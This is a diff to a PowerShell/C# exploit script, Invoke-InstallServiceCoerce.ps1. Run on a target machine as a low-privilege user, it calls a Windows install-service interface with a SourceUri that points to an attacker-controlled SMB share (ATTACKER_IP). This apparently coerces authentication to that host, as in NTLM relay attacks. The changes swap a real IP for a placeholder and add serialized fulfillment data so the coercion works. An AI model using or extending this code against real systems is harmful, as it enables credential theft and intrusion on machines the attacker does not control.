@@ -2,7 +2,7 @@
     Invoke-InstallServiceCoerce.ps1
 
     Usage (on target, as the logged-on low-priv user):
-      powershell -ExecutionPolicy Bypass -File .\Invoke-InstallServiceCoerce.ps1 -AttackerHost 192.168.139.132 -Share coerce
+      powershell -ExecutionPolicy Bypass -File .\Invoke-InstallServiceCoerce.ps1 -AttackerHost ATTACKER_IP -Share coerce
 #>
 
 [CmdletBinding()]
@@ -59,13 +59,19 @@ public static class ISC {
       if(RoActivateInstance(cls,out obj)<0)return "ActivateFail";
       var iid=new Guid("e4893a99-9270-42b9-9a62-683d6ceed250");
       if(VT<QI>(obj,0)(obj,ref iid,out ctl)<0)return "QIFail";
+      string fulfillment="{"+
+        "\"ProductId\":\"coerce\",\"SkuId\":\"0001\",\"ProductTitle\":\"coerce\","+
+        "\"PackageFamilyName\":"+J(pfn)+","+
+        "\"FulfillmentPluginId\":"+J(pfn)+","+
+        "\"Market\":\"US\",\"SourceUri\":"+J(unc)+"}";
       string props="{"+
         "\"SkipCatalogLookup\":true,"+
         "\"SourceUri\":"+J(unc)+","+
-        "\"ProductId\":\"coerce\",\"SkuId\":\"0001\","+
+        "\"ProductId\":\"coerce\",\"SkuId\":\"0001\",\"ProductTitle\":\"coerce\","+
         "\"PackageFamilyName\":"+J(pfn)+","+
         "\"FulfillmentPluginId\":"+J(pfn)+","+
-        "\"Market\":\"US\"}";
+        "\"Market\":\"US\","+
+        "\"SerializedFulfillmentData\":"+J(fulfillment)+"}";
       IntPtr hcv=HS("isc"),hca=HS(""),h3=HS(""),h4=HS(""),hp=HS(props),ho=HS("{}");
       int hr=VT<CW>(ctl,8)(ctl,hcv,hca,h3,h4,hp,ho,out view);
       foreach(var h in new[]{hcv,hca,h3,h4,hp,ho})WindowsDeleteString(h);
